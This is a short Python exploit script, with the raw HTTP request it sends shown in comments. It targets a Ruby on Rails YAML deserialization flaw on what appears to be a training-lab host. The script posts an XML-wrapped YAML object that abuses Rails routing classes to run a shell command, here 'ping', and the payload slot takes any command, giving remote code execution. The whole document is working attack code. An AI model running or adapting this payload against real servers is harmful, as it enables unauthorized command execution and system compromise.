# 
# POST / HTTP/1.1
# Host: ptl-b94d6426-320bedaa.libcurl.so
# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
# Cookie: _myapp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTFhYWVhYjFjZTI3NWNiOTU2ODgyOTA0YTg0YjNkYTkwBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMVVyMmp3dWl5RVFMKzVySVBrS3N1MVVkdUMvelI5ZkFCckFmT1NpNHE0NTA9BjsARg%3D%3D--a698c07c91532ef10be6ad11814ad13cf7c36e7c
# Connection: close
# Content-Type: text/xml
# X-HTTP-Method-Override: get
# Content-Length: 462
# 
# <?xml version="1.0" encoding="UTF-8"?>
# <exploit type="yaml">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
# ? |
#   foo
#   (system('ping -c10 localhost'); @executed = true) unless @executed
#   __END__
# : !ruby/struct
#   defaults:
#     :action: create
#     :controller: foos
#   required_parts: []
#   requirements:
#     :action: create
#     :controller: foos
#   segment_keys:
#     - :format</exploit>
import requests
import html
import sys

url = "http://ptl-b94d6426-320bedaa.libcurl.so/"
payload = "system('ping -c10 127.0.0.1')"

yaml = '''
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  foo
  ({}; @executed = true) unless @executed
  __END__
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format</exploit>
'''.format(payload)

xml = '''
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">{}</exploit>
'''.format(html.escape(yaml))

header = {
    'Content-Type': 'text/xml',
    'X-HTTP-Method-Override': 'get'
}

resp = requests.post(url, data=xml, headers=header)
if resp.status_code == 200:
    print("Command sucessfully executed!")
    sys.exit(1)
else:
    print('Ouups something goes wrong!')
    print('Status code: {}'.format(resp.status_code))
    sys.exit(1)


